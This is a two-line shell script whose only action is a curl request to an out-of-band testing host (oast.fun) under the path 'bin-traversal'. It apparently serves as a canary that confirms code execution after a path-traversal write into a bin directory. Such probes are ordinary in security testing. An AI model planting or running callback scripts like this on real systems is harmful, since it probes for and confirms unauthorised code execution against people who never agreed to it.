#!/bin/sh
curl https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/bin-traversal
